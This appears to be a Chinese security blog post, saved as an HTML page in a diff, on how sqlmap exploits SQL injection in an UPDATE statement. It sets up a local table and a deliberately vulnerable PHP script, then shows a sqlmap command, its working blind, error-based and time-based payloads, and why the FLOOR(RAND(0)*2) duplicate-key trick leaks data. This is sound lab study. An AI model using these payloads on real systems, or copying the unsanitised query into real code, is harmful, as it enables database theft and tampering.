@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"m0nst3r.me","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="[TOC]##起因update操作在数据库中用来更改数据，如果遇到这样的注入点，胡乱测试一通可能会引起不可恢复的错误，所以本地搭建环境写了个简单脚本测试下sqlmap是怎么注入update语句的注入点的。 ##准备环境###数据库设置创建简单的表并插入数据 12345678910CREATE TABLE IF NOT EXISTS &#96;atable&#96; (  &#96;userid&#96; int(11) NOT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入学习——update注入">
+<meta property="og:url" content="https://m0nst3r.me/sqli/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94update%E6%B3%A8%E5%85%A5.html">
+<meta property="og:site_name" content="m0nst3r&#39;s blog">
+<meta property="og:description" content="[TOC]##起因update操作在数据库中用来更改数据，如果遇到这样的注入点，胡乱测试一通可能会引起不可恢复的错误，所以本地搭建环境写了个简单脚本测试下sqlmap是怎么注入update语句的注入点的。 ##准备环境###数据库设置创建简单的表并插入数据 12345678910CREATE TABLE IF NOT EXISTS &#96;atable&#96; (  &#96;userid&#96; int(11) NOT">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2017-11-09T03:12:00.000Z">
+<meta property="article:modified_time" content="2022-08-08T14:27:53.015Z">
+<meta property="article:author" content="m0nst3r">
+<meta property="article:tag" content="Web安全,渗透测试,网络安全,代码审计,逆向,编程">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://m0nst3r.me/sqli/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94update%E6%B3%A8%E5%85%A5.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://m0nst3r.me/sqli/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94update%E6%B3%A8%E5%85%A5.html","path":"sqli/SQL注入学习——update注入.html","title":"SQL注入学习——update注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入学习——update注入 | m0nst3r's blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">m0nst3r's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hello, Bugs</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">m0nst3r</p>
+  <div class="site-description" itemprop="description">Web安全、渗透测试、网络安全、代码审计、逆向、编程</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/sqli/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94update%E6%B3%A8%E5%85%A5.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入学习——update注入 | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入学习——update注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-11-09 11:12:00" itemprop="dateCreated datePublished" datetime="2017-11-09T11:12:00+08:00">2017-11-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/sqli/" itemprop="url" rel="index"><span itemprop="name">sqli</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>[TOC]<br>##起因<br>update操作在数据库中用来更改数据，如果遇到这样的注入点，胡乱测试一通可能会引起不可恢复的错误，所以本地搭建环境写了个简单脚本测试下sqlmap是怎么注入update语句的注入点的。</p>
+<p>##准备环境<br>###数据库设置<br>创建简单的表并插入数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `atable` (</span><br><span class="line">  `userid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `truename` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `email` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`userid`)</span><br><span class="line">) ENGINE<span class="operator">=</span>MyISAM  <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>latin1 AUTO_INCREMENT<span class="operator">=</span><span class="number">3</span> ;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">INSERT</span> <span class="keyword">INTO</span> `atable` (`userid`, `truename`, `email`) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;123123&#x27;</span>),</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;111&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>###有漏洞的PHP程序<br>创建有漏洞的php程序（<code>sqli-update.php</code>）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&#x27;select names utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>)) &#123;</span><br><span class="line"><span class="variable">$truename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;truename&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$truename</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$email</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE atable set `email`=&#x27;<span class="subst">$email</span>&#x27; where `truename`=&#x27;<span class="subst">$truename</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Success!&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Failed!&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">mysql_error</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&#x27;select * from atable&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rows</span>)) &#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;SQLi UPDATE&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;#&#x27;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">用户名&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;truename&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">邮  箱&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;修改&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>用<code>sqlmap</code>跑下加上<code>v 3</code>查看过程<br>  命令如下：<code>sqlmap -u &quot;http://192.168.1.110/test/sqli-update.php?truename=test&amp;email=123123&amp;submit=修改#&quot; -p truename -v 3</code></li>
+</ol>
+<p>结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">GET parameter &#x27;truename&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] </span><br><span class="line">sqlmap identified the following injection point(s) with a total of 436 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: truename (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</span><br><span class="line">    Payload: truename=test&#x27; RLIKE (SELECT (CASE WHEN (1387=1387) THEN 0x74657374 ELSE 0x28 END))-- yLoM&amp;email=123123&amp;submit=修改</span><br><span class="line">    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: truename=test&#x27; AND (SELECT 5950 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT (ELT(5950=5950,1))),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sDHA&amp;email=123123&amp;submit=修改</span><br><span class="line">    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT(&#x27;[DELIMITER_START]&#x27;,([QUERY]),&#x27;[DELIMITER_STOP]&#x27;,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class="line">    Payload: truename=test&#x27; AND SLEEP(5)-- gzuL&amp;email=123123&amp;submit=修改</span><br><span class="line">    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</span><br><span class="line">	---</span><br><span class="line">	[22:09:35] [INFO] the back-end DBMS is MySQL</span><br><span class="line">	web server operating system: Windows</span><br><span class="line">	web application technology: Apache 2.4.23, PHP 5.2.17</span><br><span class="line">	back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">	[22:09:35] [INFO] fetching database names</span><br><span class="line">	[22:09:35] [DEBUG] searching for error chunk length...</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 7445 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x34,1024)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- xlNW</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 6284 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x32,512)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EObM</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 1981 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x36,256)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- iJmF</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 4432 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x34,54)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UOzJ</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 8781 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ZjQp</span><br><span class="line">	[22:09:35] [INFO] the SQL query used returns 4 entries</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 1538 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- enAv</span><br><span class="line">	[22:09:36] [INFO] retrieved: information_schema</span><br><span class="line">	[22:09:36] [PAYLOAD] test&#x27; AND (SELECT 2345 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Ozef</span><br><span class="line">	[22:09:36] [INFO] retrieved: mysql</span><br><span class="line">	[22:09:36] [PAYLOAD] test&#x27; AND (SELECT 4469 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 2,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zwdT</span><br><span class="line">	[22:09:36] [INFO] retrieved: performance_schema</span><br><span class="line">	[22:09:36] [PAYLOAD] test&#x27; AND (SELECT 2893 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 3,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IOqF</span><br><span class="line">	[22:09:36] [INFO] retrieved: test</span><br><span class="line">	[22:09:36] [DEBUG] performed 9 	queries in 0.62 seconds</span><br><span class="line">	available databases [4]:</span><br><span class="line">	[*] information_schema</span><br><span class="line">	[*] mysql</span><br><span class="line">	[*] performance_schema</span><br><span class="line">	[*] test</span><br></pre></td></tr></table></figure>
+
+<p>##SQLMap的方式</p>
+<p>提取SQLMap的注入语句，可发现如下关键注入方式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> atable <span class="keyword">set</span> `email`<span class="operator">=</span><span class="string">&#x27;111&#x27;</span> <span class="keyword">where</span> `truename`<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> </span><br><span class="line"><span class="keyword">AND</span> </span><br><span class="line">(<span class="keyword">SELECT</span> <span class="number">1538</span> <span class="keyword">FROM</span>(</span><br><span class="line">	<span class="keyword">SELECT</span> </span><br><span class="line">		<span class="built_in">COUNT</span>(<span class="operator">*</span>),</span><br><span class="line">		CONCAT(</span><br><span class="line">			<span class="number">0x71707a7171</span>,</span><br><span class="line">			(<span class="keyword">SELECT</span> MID(</span><br><span class="line">						(IFNULL(</span><br><span class="line">								<span class="built_in">CAST</span>(schema_name <span class="keyword">AS</span> <span class="type">CHAR</span>),<span class="number">0x20</span></span><br><span class="line">								)</span><br><span class="line">						),<span class="number">1</span>,<span class="number">54</span></span><br><span class="line">					) <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">			),</span><br><span class="line">			<span class="number">0x7176707671</span>,</span><br><span class="line">			<span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)</span><br><span class="line">		)x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x</span><br><span class="line">	)a</span><br><span class="line">)<span class="comment">-- enAv&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>##产生错误的原因<br>当随机数种子为<code>0</code>的时候，表达式<code>FLOOR(RAND(0)*2)</code> 会返回如下结果:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)x <span class="keyword">FROM</span> information_schema.tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> x <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span> <span class="operator">&lt;</span><span class="comment">-- error happens here</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
+<p>因为第三个值和第二个值重复，所以产生了错误. 只要行数<code>&gt;3</code>的表都可以作为<code>FROM</code>的表来用，不过<code>information_schema.tables</code>和<code>information_schema.plugins</code>较为常用。<br>其中，能够产生错误的两个必要条件是<code>count(*)</code>和<code>GROUP BY</code>语句，缺一不可。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>),<span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)x <span class="keyword">FROM</span> information_schema.tables <span class="keyword">GROUP</span> <span class="keyword">BY</span> x;</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/web-sec/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%20WHO%20ARE%20YOU_%20Write-Up%20.html" rel="prev" title="实验吧CTF WHO ARE YOU? Write-Up">
+                  <i class="fa fa-chevron-left"></i> 实验吧CTF WHO ARE YOU? Write-Up
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89.html" rel="next" title="逆向工程——汇编基础（一）">
+                  逆向工程——汇编基础（一） <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m0nst3r</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
